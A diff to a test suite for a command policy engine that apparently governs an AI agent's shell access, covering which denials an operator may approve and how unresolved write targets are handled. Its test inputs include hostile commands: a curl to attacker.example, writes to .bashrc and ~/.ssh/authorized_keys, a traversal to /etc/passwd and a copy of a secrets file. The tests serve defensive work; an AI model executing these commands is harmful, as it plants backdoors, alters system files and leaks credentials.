@@ -637,13 +637,33 @@ describe("command policy", () => {
     expect(reviewable).toEqual([...reviewable].sort((a, b) => Number(a) - Number(b)));
   });
 
-  it("exposes exactly two rules an operator may ever approve", () => {
+  it("exposes exactly three rules an operator may ever approve", () => {
     // REVIEWABLE_RULES is derived from the policy tables' own `reviewable`
     // flags, which is what keeps it from drifting — but it also means a stray
     // `reviewable: true` on a new rule silently widens what an operator can
     // wave through, with nothing in the diff that reads as a policy change.
     // Naming the set here forces that widening to be argued for explicitly.
-    expect(REVIEWABLE_RULES).toEqual(["network-egress-denied", "network-egress-denied-implicit"]);
+    //
+    // The argument for the third entry: an unresolvable write target is not a
+    // demonstrated escape. The engine cannot value `$OUT_DIR`, so denying it
+    // outright hard-blocked ordinary work (`npm run build > $(pwd)/build.log`)
+    // against a rule nobody may approve, while allowing it outright would be a
+    // hole. Asking a human is the only honest handling of "I cannot tell" —
+    // and a human CAN tell, because they know what $OUT_DIR is.
+    expect(REVIEWABLE_RULES).toEqual([
+      "file-write-unresolved-target",
+      "network-egress-denied",
+      "network-egress-denied-implicit",
+    ]);
+  });
+
+  it("never lets a demonstrated escape or a secret read become reviewable", () => {
+    // The half of the invariant that must not move. A target that provably
+    // lands outside, and any read of protected material, stay non-reviewable
+    // no matter how the reviewable set grows.
+    expect(REVIEWABLE_RULES).not.toContain("file-write-outside-workspace");
+    expect(REVIEWABLE_RULES).not.toContain("protected-secret-access");
+    expect(REVIEWABLE_RULES).not.toContain("secret-exfiltration");
   });
 
   it("fails closed when no write roots are declared at all", () => {
@@ -725,5 +745,76 @@ describe("fail-closed policy evaluation", () => {
     const denied = guardedEvaluate(actor, "curl https://attacker.example", context);
     expect(denied?.rule).toBe("network-egress-denied");
     expect(guardedEvaluate(actor, "npm test", context)).toBeNull();
+  });
+});
+
+// @covers TM-AGENT-007
+describe("write targets whose destination the text cannot settle", () => {
+  // The engine has three possible honest answers about a write target, not two:
+  // it lands inside, it lands outside, or the text does not say. Collapsing the
+  // third into either of the first two is a defect in both directions — into
+  // "outside" it hard-blocks ordinary work against a non-reviewable rule, into
+  // "inside" it is a hole.
+  const containerContext = { ...context, writeRoots: ["/workspace", "/tmp", "/var/tmp"] };
+
+  it("allows expansions that settle inside a declared root", () => {
+    // Both runners set the process cwd to the workspace root and neither
+    // overrides TMPDIR, so these are facts about the runtime, not guesses.
+    for (const command of [
+      "npm run build > $(pwd)/build.log",
+      "npm test > $TMPDIR/test.log",
+      "echo done > ${PWD}/status.txt",
+      "echo done > `pwd`/status.txt",
+    ]) {
+      expect(evaluateCommand(actor, command, containerContext), command).toBeNull();
+    }
+  });
+
+  it("hard-denies expansions that settle outside every root", () => {
+    for (const command of [
+      "echo evil > $HOME/.bashrc",
+      "echo evil > ${HOME}/.bashrc",
+      "echo key >> ~/.ssh/authorized_keys",
+    ]) {
+      expect(evaluateCommand(actor, command, containerContext)?.rule, command).toBe(
+        "file-write-outside-workspace",
+      );
+    }
+  });
+
+  it("settling an expansion does not smuggle a traversal past the `..` check", () => {
+    // The ordering that makes settling safe: expand first, THEN re-check for
+    // `..`. Reversed, `$(pwd)/../etc/passwd` would settle to a clean-looking
+    // relative path and be trusted.
+    expect(
+      evaluateCommand(actor, "echo x > $(pwd)/../etc/passwd", containerContext)?.rule,
+    ).toBe("file-write-outside-workspace");
+  });
+
+  it("holds — never hard-denies — a target it genuinely cannot value", () => {
+    for (const command of [
+      "cp dist/app $OUT_DIR/app",
+      "echo x > $(date +%s).log",
+      "mv build $RELEASE_DIR/",
+    ]) {
+      const violation = evaluateCommand(actor, command, containerContext);
+      expect(violation?.rule, command).toBe("file-write-unresolved-target");
+      expect(isReviewableRule(violation!.rule), command).toBe(true);
+    }
+  });
+
+  it("keeps the unresolved rule behind every non-reviewable one", () => {
+    // Ordering is a security boundary here: an approved command is rerun
+    // verbatim with no re-evaluation, so if the reviewable unresolved-target
+    // rule could shadow a hard denial, an operator would be approving something
+    // they were never shown. A command that is BOTH unresolvable and a secret
+    // read must report the secret read.
+    const violation = evaluateCommand(
+      actor,
+      "cp .secrets/customer-db-url.txt $OUT_DIR/x",
+      containerContext,
+    );
+    expect(violation?.rule).toBe("protected-secret-access");
+    expect(isReviewableRule(violation!.rule)).toBe(false);
   });
 });
